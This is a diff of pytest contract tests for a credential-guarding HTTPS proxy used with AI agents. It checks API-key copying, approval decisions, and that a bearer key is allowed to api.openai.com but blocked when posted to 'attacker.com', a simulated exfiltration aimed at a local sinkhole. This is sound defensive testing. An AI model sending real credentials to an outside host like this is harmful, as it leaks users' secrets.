@@ -22,9 +22,11 @@ import pytest
 import tomlkit
 
 from safeyolo.runtime_identity import process_is_alive, process_start_token
+from safeyolo.rust_proxy import _ensure_signing_ca
 from tests.proxy_contracts import test_native_credentials_cli as credentials
-from tests.proxy_contracts.harness import request
-from tests.proxy_contracts.scenarios import origin_server
+from tests.proxy_contracts.harness import launch_proxy, request
+from tests.proxy_contracts.scenarios import OriginHandler, origin_server
+from tests.proxy_contracts.test_https_contract import intercepted_request, mapped_https_origin
 from tests.proxy_contracts.test_native_coord_operator import terminal, wait_terminal_exit
 from tests.proxy_contracts.test_native_policy_cli import native_inputs, native_instance, restarted_proxy
 
@@ -226,9 +228,13 @@ def _codex_choice(until, master, *, new=True, subscription=True):
 
 
 @pytest.mark.parametrize("selection", ["host", "file"])
-def test_codex_client_api_key_copy_preserves_custody_policy_and_does_not_create_a_vault(codex_login_launch, selection):
+def test_codex_client_api_key_copy_preserves_custody_policy_and_does_not_create_a_vault(
+    codex_login_launch, selection, blackbox_chain_material,
+):
     instance = codex_login_launch
-    instance.login.write_text(json.dumps({"OPENAI_API_KEY": "synthetic-client-held-api-key"}) + "\n")
+    # Valid-format fixture input exercises the real classifier, never a provider.
+    key = "sk-proj-" + "a1b2c3d4e5f6g7h8i9j0" * 4
+    instance.login.write_text(json.dumps({"OPENAI_API_KEY": key}) + "\n")
     original = instance.login.read_bytes()
     with terminal(instance, instance.arguments) as (process, master, until):
         _codex_choice(until, master, subscription=False)
@@ -237,7 +243,7 @@ def test_codex_client_api_key_copy_preserves_custody_policy_and_does_not_create_
         os.write(master, choice.encode() + b"\n")
         output = until(b"First-agent services failed")
         assert b"API-key login copied for first" in output
-        assert b"synthetic-client-held-api-key" not in output
+        assert key.encode() not in output
         assert b"Choose credential storage" not in output
         assert wait_terminal_exit(process, master, bytearray(), timeout=5) != 0
     copied = instance.root / "agents/first/home/.codex/auth.json"
@@ -246,6 +252,34 @@ def test_codex_client_api_key_copy_preserves_custody_policy_and_does_not_create_
     assert (instance.root / "policy.toml").read_bytes() == policy
     assert not (instance.root / "data/credentials.enc").exists()
     assert not (instance.root / "data/credentials.key").exists()
+    # Copying grants no authority. Use the initialized policy and copied input
+    # at the native HTTPS boundary; this controlled reply is not a model task.
+    public, private = blackbox_chain_material
+    selected_key = json.loads(copied.read_text())["OPENAI_API_KEY"]
+
+    class ApiRequest(OriginHandler):
+        def do_POST(self):
+            self.server.credential = self.headers.get("Authorization")
+            self.rfile.read(int(self.headers.get("Content-Length", "0")))
+            self.do_GET()
+
+    with mapped_https_origin(public / "sinkhole.crt", private / "sinkhole.key",
+                             ("api.openai.com", "attacker.com")) as (origin, parent):
+        origin.RequestHandlerClass = ApiRequest
+        directory = instance.root.parent / "controlled-provider"
+        _ensure_signing_ca(directory / "ca")
+        with launch_proxy("rust", directory, policy.decode(), native_product=True, tls=True,
+                          upstream_ca=public / "ca.crt", parent_proxy=parent, agents=("first",)) as proxy:
+            headers = {"Authorization": "Bearer " + selected_key}
+            status, _, _ = intercepted_request(proxy, "api.openai.com", agent="first",
+                                               path="/v1/responses", method="POST", headers=headers, body=b'{}')
+            assert status == 200 and len(origin.requests) == 1
+            assert origin.credential == headers["Authorization"]
+            assert proxy.events("security.credential_guard")[0]["decision"] == "allow"
+            status, _, _ = intercepted_request(proxy, "attacker.com", agent="first",
+                                               path="/v1/responses", method="POST", headers=headers, body=b'{}')
+            assert status == 428 and len(origin.requests) == 1
+    assert (instance.root / "policy.toml").read_bytes() == policy
 
 
 @pytest.mark.parametrize("custom_name", [False, True])
@@ -1128,10 +1162,11 @@ def test_direct_credential_decision_keeps_the_selected_destination(tmp_path, dec
         identifier = instance.admin("GET", "/admin/approvals")["approvals"][0]["request_id"]
         assert request(instance.paths["alice"], target, headers=headers)[0] == 428
         assert request(instance.paths["alice"], changed, headers=headers)[0] == 428
+        expected = "approved" if decision == "approve" else "rejected"
         if surface == "direct":
             result = instance.cli("approvals", decision, identifier, "--agent", "alice", "--json")
             assert result.returncode == 0, result.stderr
-            assert json.loads(result.stdout)["status"] == ("approved" if decision == "approve" else "rejected")
+            assert json.loads(result.stdout)["status"] == expected
         else:
             with terminal(instance, ["inspect", "--agent", "alice"]) as (process, master, until):
                 until(b"inspect> ")
@@ -1140,10 +1175,13 @@ def test_direct_credential_decision_keeps_the_selected_destination(tmp_path, dec
                 assert b"Status: pending" in output
                 os.write(master, f"{decision} {identifier}\n".encode())
                 output = until(b"inspect> ")
-                expected = b"approved" if decision == "approve" else b"rejected"
-                assert b"Status: " + expected in output
+                outcome = f"Request {identifier}: {expected}".encode()
+                assert output.count(outcome) == 1, output
+                assert b"first-launch-key" not in output
                 os.write(master, b"quit\n")
                 assert wait_terminal_exit(process, master, bytearray(), timeout=5) == 0
+        canonical = instance.admin("GET", f"/admin/approvals/{identifier}")
+        assert canonical["status"] == expected and canonical["action"]["host"] == "127.0.0.1"
         _wait_for_active_policy(instance)
         assert request(instance.paths["alice"], changed, headers=headers)[0] == 428
         assert origin.accepts == 0
